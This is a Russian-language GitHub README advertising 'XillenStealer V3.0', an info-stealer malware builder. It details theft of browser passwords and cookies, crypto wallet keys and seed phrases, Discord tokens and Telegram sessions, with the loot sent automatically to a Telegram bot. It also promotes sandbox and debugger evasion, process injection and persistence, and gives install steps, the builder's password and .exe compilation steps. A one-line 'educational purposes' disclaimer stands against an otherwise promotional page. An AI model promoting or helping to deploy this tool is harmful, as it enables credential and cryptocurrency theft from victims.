# 🚀 XillenStealer V3.0 - Кросс-платформенный стиллер нового поколения

<div align="center">
  <img width="961" height="86" alt="XillenStealer V3.0 Logo" src="https://github.com/user-attachments/assets/aeb49a18-fc1d-4a24-bc1c-459fb39a51ee" />
</div>

<div align="center">
  
[![Windows](https://img.shields.io/badge/Windows-10%2F11-0078D6?logo=windows)](https://www.microsoft.com/windows)
[![Linux](https://img.shields.io/badge/Linux-Ubuntu%2FKali%2FArch-DD4814?logo=linux)](https://www.linux.org)
[![Python](https://img.shields.io/badge/Python-3.11+-3776AB?logo=python&logoColor=white)](https://python.org)
[![Telegram](https://img.shields.io/badge/Telegram-2CA5E0?logo=telegram&logoColor=white)](https://telegram.org)
[![License](https://img.shields.io/badge/License-MIT-red.svg)](LICENSE)
[![Download](https://img.shields.io/badge/СКАЧАТЬ_V3.0-38MB-blue)](https://github.com/BengaminButton/XillenStealer/archive/refs/heads/main.zip)
[![Version](https://img.shields.io/badge/Версия-3.0-green.svg)](https://github.com/BengaminButton/XillenStealer)

**Мощный Python-стиллер нового поколения с автоматической отправкой данных через Telegram**

</div>

---

## ✨ Что нового в V3.0

### 🎨 **Современный интерфейс**
- **Профессиональный дизайн** с плавными анимациями
- **Две темы**: Глубокий тёмный и Алая
- **Адаптивный интерфейс** 1000x650px
- **Красивые кнопки** с hover-эффектами

### 🔧 **Улучшенный билдер**
- **Встроенные уведомления** без всплывающих окон
- **Прогресс-бар** для компиляции в .exe
- **Центрированные уведомления**
- **Исправлены все ошибки** интерфейса

### 📊 **Обновлённые отчёты**
- **Красивая рамка** с подписью в HTML-отчётах
- **Интерактивные ссылки** с hover-эффектами
- **Градиентный дизайн** footer'а
- **Убраны лишние логотипы**

### 🛡️ **Новые функции безопасности**
- **VM Detection** - обнаружение виртуальных машин
- **Sandbox Detection** - обнаружение песочниц и анализаторов
- **Anti-Debug** - защита от отладчиков
- **Process Injection** - внедрение в explorer.exe
- **Persistence** - автозапуск через Task Scheduler/Cron

### 🎮 **Расширенный сбор данных**
- **Epic Games Launcher** - данные аккаунта
- **Minecraft** - информация об аккаунтах
- **GTA V** - настройки и данные пользователя
- **Vivaldi Browser** - полная поддержка браузера
- **Улучшенный Steam** - расширенные данные

### 🔄 **Система автозапуска**
- **Windows Task Scheduler** - скрытые задачи
- **Linux Cron** - автозапуск через crontab
- **Stealth Mode** - маскировка под системные процессы

---

## 🔥 Основные возможности

| Функция | Описание |
|---------|----------|
| **🖥️ HTML отчёт** | Профессиональный отчёт с графиками и сортировкой данных |
| **🔐 Шифрование** | Расшифровка паролей браузеров (Chrome, Firefox, Edge, Vivaldi) |
| **🤖 Telegram бот** | Автоматическая отправка данных в Telegram чат |
| **📸 Скриншот** | Захват текущего экрана пользователя |
| **🌐 Кросс-платформа** | Поддержка Windows, Linux и macOS |
| **🎨 Темы** | Две красивые цветовые схемы |
| **⚡ Анимации** | Плавные переходы и эффекты |
| **🛡️ VM Detection** | Обнаружение виртуальных машин и песочниц |
| **💉 Process Injection** | Внедрение в системные процессы |
| **🔄 Persistence** | Автозапуск через Task Scheduler/Cron |
| **🎮 Game Launchers** | Epic Games, Minecraft, GTA V, Steam |
| **🔍 Anti-Debug** | Защита от отладчиков и анализаторов |

## 📊 Пример HTML отчёта
<div align="center">
  <img width="1920" height="993" alt="HTML Report Example" src="https://github.com/user-attachments/assets/d6b6a3d5-ad6f-4b32-bb57-9d6e3d920554" />
</div>

## 🌐 Поддерживаемые браузеры

| Браузер  | Пароли | Куки | История |
|----------|--------|------|---------|
| **Chrome** | ✅    | ✅   | ✅      |
| **Firefox** | ✅    | ✅   | ✅      |
| **Edge**   | ✅    | ✅   | ✅      |
| **Opera**  | ✅    | ✅   | ✅      |
| **Brave**  | ✅    | ✅   | ✅      |
| **Vivaldi** | ✅    | ✅   | ✅      |

## 🎮 Поддерживаемые игровые лаунчеры

| Лаунчер | Данные аккаунта | Настройки |
|---------|-----------------|-----------|
| **Epic Games** | ✅ Username | ✅ Конфигурация |
| **Minecraft** | ✅ Username, Email | ✅ Профили |
| **GTA V** | ✅ Username, Email | ✅ Настройки |
| **Steam** | ✅ Расширенные данные | ✅ Конфигурация |

## 🛠️ Установка

### Для Windows:
1. Скачайте архив и распакуйте
2. Запустите `install_deps.bat` (двойной клик или через командную строку)
3. После установки запустите `builder.py`

### Для Linux (Ubuntu/Kali/Arch):
```bash
# Скачать и распаковать
wget https://github.com/BengaminButton/XillenStealer/xillenstealer-main.zip
unzip xillenstealer-main.zip
cd XillenStealer

# Дать права на выполнение
chmod +x install_deps.sh

# Запустить установщик
./install_deps.sh

# После установки запустить билдер
source venv/bin/activate && python3 builder.py
```

## 🧹 Антидот (удаление следов)

В комплекте есть специальный скрипт `XillenStealerAntiDot.py` для полной очистки системы от автозапуска, задач, процессов и файлов, связанных с XillenStealer и его копиями.

- Автоматически завершает все связанные процессы (включая любые переименованные версии)
- Удаляет задачи из планировщика, автозагрузку из реестра и папки Startup
- Проверяет остатки и повторяет очистку до полной чистоты
- Красивый вывод с цветами и авторской рамкой

**Как использовать:**
1. Установите зависимость:
   ```bash
   pip install colorama psutil
   ```
2. Запустите скрипт от имени администратора:
   ```bash
   python antidote.py
   ```с

> Если что-то останется — скрипт покажет, что именно, и даст рекомендации.

## ⚡ Использование

1. **Запустите билдер:**
   ```bash
   python builder.py
   ```

2. **Введите пароль:** `layscrab`

3. **Заполните параметры:**
   - Токен бота Telegram
   - ID чата для отправки
   - Имя стиллера
   - Выберите модули для сбора

4. **Выберите тему:**
   - Глубокий тёмный (по умолчанию)
   - Алая

## 📦 Собираемые данные

### 🖥️ **Системная информация**
- **CPU, RAM, GPU, диски** - полная информация о железе
- **Сетевые данные** - IP адреса, MAC адрес, hostname
- **Информация о системе** - ОС, архитектура, пользователь

### 🔐 **Браузеры (6 поддерживаемых)**
- **Пароли** - Chrome, Firefox, Edge, Opera, Brave, Vivaldi
- **Куки** - все сессии и авторизации
- **История** - полная история посещений
- **Автозаполнение** - сохранённые формы

### 🎮 **Игровые аккаунты**
- **Epic Games** - данные входа и настройки
- **Minecraft** - аккаунты и профили
- **GTA V** - пользовательские данные
- **Steam** - расширенная информация

### 💰 **Криптовалюты и кошельки**
- **Bitcoin, Ethereum** - приватные ключи
- **MetaMask, Trust Wallet** - seed фразы
- **Другие кошельки** - данные доступа

### 📱 **Мессенджеры и соцсети**
- **Discord токены** - полный доступ к аккаунту
- **Telegram сессии** - tdata файлы
- **Другие приложения** - сохранённые данные

### 🛡️ **Дополнительные данные**
- **Скриншот экрана** - текущее состояние
- **VM Detection** - информация об окружении
- **Системные процессы** - список запущенных программ

## 🎨 Скриншоты интерфейса

<div align="center">
  
  <h3>📱 **Интерфейс XillenStealer V3.0:**</h3>
  
  <table>
    <tr>
      <td align="center">
        <strong>🖥️ GUI с обычной темой</strong><br>
        <em>Глубокий тёмный интерфейс</em><br>
        <img width="1920" height="1048" alt="GUI Dark Theme" src="https://github.com/user-attachments/assets/55ef8af5-aba6-471f-82e7-dbb918330431" />
      </td>
      <td align="center">
        <strong>🔴 GUI с алой темой</strong><br>
        <em>Алая цветовая схема</em><br>
        <img width="1920" height="1054" alt="GUI Scarlet Theme" src="https://github.com/user-attachments/assets/f06ba91c-e2f4-4546-8d8e-c9afe599c50d" />
      </td>
    </tr>
    <tr>
      <td align="center">
        <strong>📊 HTML отчёт</strong><br>
        <em>Новый дизайн footer'а</em><br>
        <img width="1920" height="993" alt="HTML Report Footer" src="https://github.com/user-attachments/assets/67ec55bf-fb46-4ae2-8703-5be0aa1d0493" />
      </td>
      <td align="center">
        <strong>⚙️ Настройки</strong><br>
        <em>Переключатель тем</em><br>
        <img width="1920" height="1054" alt="Settings Screen" src="https://github.com/user-attachments/assets/fe8316f1-0488-4185-bfd7-07424c2e3c53" />
      </td>
    </tr>
  </table>

</div>

## 📊 **Создание примера HTML отчёта**

Для демонстрации HTML отчёта без реального сбора данных:

```bash
python steler.py --sample
```

Это создаст файл `sample_report.html` с демонстрационными данными, который можно использовать для скриншота.

## ⚠️ Предупреждение

<div align="center">

**⚠️ ВНИМАНИЕ! ⚠️**

**ПРОЕКТ СОЗДАН ДЛЯ ОБРАЗОВАТЕЛЬНЫХ ЦЕЛЕЙ!**

**НЕ ИСПОЛЬЗУЙТЕ ДЛЯ НЕЗАКОННОЙ ДЕЯТЕЛЬНОСТИ!**

</div>

## 🔧 Скрипты установки

В комплекте идут два скрипта для автоматической установки:

### `install_deps.bat` - для Windows:
- Устанавливает все Python-зависимости
- Собирает исполняемый файл через PyInstaller

### `install_deps.sh` - для Linux:
- Автоматически определяет дистрибутив (Ubuntu/Kali/Arch)
- Устанавливает системные зависимости
- Создаёт виртуальное окружение
- Устанавливает Python-пакеты
- Проверяет корректность установки

## ⚡ Альтернативная установка (вручную):

```bash
pip install -r requirements.txt
```

## 🚀 Компиляция в .exe

После создания стиллера билдер предложит скомпилировать его в исполняемый файл:

1. Выберите "Да" для компиляции
2. Дождитесь завершения процесса
3. Получите готовый .exe файл

## 📝 Changelog

<div align="center">

| Функция | V3.0 (2025) 🚀 | V2.0 (2024) 📦 |
|---------|----------------|----------------|
| **🎨 Интерфейс** | ✨ Полностью переработанный с анимациями | 🖥️ Базовый тёмный дизайн |
| **🎨 Темы** | 🎨 Две темы: Глубокий тёмный + Алая | ❌ Только одна тема |
| **🔧 Ошибки** | ✅ Исправлены все ошибки интерфейса | ❌ Множество багов |
| **📊 HTML отчёты** | 📊 Красивая рамка с интерактивными ссылками | 📊 Простой footer |
| **⚡ Производительность** | ⚡ Улучшена стабильность | ❌ Медленная работа |
| **🎯 Анимации** | 🎯 Плавные переходы и эффекты | ❌ Без анимаций |
| **🖼️ Логотип** | ✅ Убран из HTML-отчётов | ❌ Присутствует |
| **🎨 Footer** | 🎨 Градиентный с hover-эффектами | 📊 Простой текст |
| **📱 Адаптивность** | 📱 Интерфейс 1000x650px | ❌ Фиксированный размер |
| **🔄 Уведомления** | 🔄 Встроенные без всплывающих окон | ❌ Всплывающие окна |
| **📊 Прогресс-бар** | 📊 Для компиляции в .exe | ❌ Отсутствует |
| **🎨 Кнопки** | 🎨 Профессиональные с hover-эффектами | ❌ Стандартные |
| **🛡️ VM Detection** | ✅ Обнаружение виртуальных машин | ❌ Отсутствует |
| **💉 Process Injection** | ✅ Внедрение в explorer.exe | ❌ Отсутствует |
| **🔄 Persistence** | ✅ Автозапуск через Task Scheduler/Cron | ❌ Отсутствует |
| **🎮 Game Launchers** | ✅ Epic Games, Minecraft, GTA V, Steam | ❌ Отсутствуют |
| **🌐 Vivaldi Browser** | ✅ Полная поддержка | ❌ Отсутствует |
| **🔍 Anti-Debug** | ✅ Защита от отладчиков | ❌ Отсутствует |
| **🎯 Stealth Mode** | ✅ Маскировка под системные процессы | ❌ Отсутствует |
| **🤖 Telegram** | ✅ Интеграция | ✅ Интеграция |
| **🌐 Кросс-платформа** | ✅ Windows, Linux, macOS | ✅ Windows, Linux, macOS |

</div>

## 👥 Авторы

<div align="center">

**Создано командой [Xillen Killers](https://t.me/XillenAdapter)**

**Разработчик: [@BengaminButton](https://github.com/BengaminButton)**

[![Telegram](https://img.shields.io/badge/Telegram-@XillenAdapter-2CA5E0?logo=telegram)](https://t.me/XillenAdapter)
[![GitHub](https://img.shields.io/badge/GitHub-@BengaminButton-181717?logo=github)](https://github.com/BengaminButton)

</div>

## 📄 Лицензия

Этот проект распространяется под лицензией MIT. См. файл [LICENSE](LICENSE) для подробностей.

---

<div align="center">

## ⭐ **ПОДДЕРЖИТЕ ПРОЕКТ!** ⭐

**Если XillenStealer V3.0 понравился - поставьте звезду на GitHub!**

[![GitHub stars](https://img.shields.io/github/stars/BengaminButton/XillenStealer?style=social&label=⭐%20Stars)](https://github.com/BengaminButton/XillenStealer)
[![GitHub forks](https://img.shields.io/github/forks/BengaminButton/XillenStealer?style=social&label=🍴%20Forks)](https://github.com/BengaminButton/XillenStealer)
[![GitHub watchers](https://img.shields.io/github/watchers/BengaminButton/XillenStealer?style=social&label=👀%20Watchers)](https://github.com/BengaminButton/XillenStealer)

### 🚀 **Быстрые ссылки:**
[![Download ZIP](https://img.shields.io/badge/📥%20Скачать%20ZIP-38MB-blue?style=for-the-badge)](https://github.com/BengaminButton/XillenStealer/archive/refs/heads/main.zip)
[![Telegram](https://img.shields.io/badge/💬%20Telegram-@XillenAdapter-2CA5E0?style=for-the-badge)](https://t.me/XillenAdapter)
[![GitHub](https://img.shields.io/badge/💻%20GitHub-@BengaminButton-181717?style=for-the-badge)](https://github.com/BengaminButton)

---

**🎯 XillenStealer V3.0 - Новое поколение стиллеров! 🎯**

</div>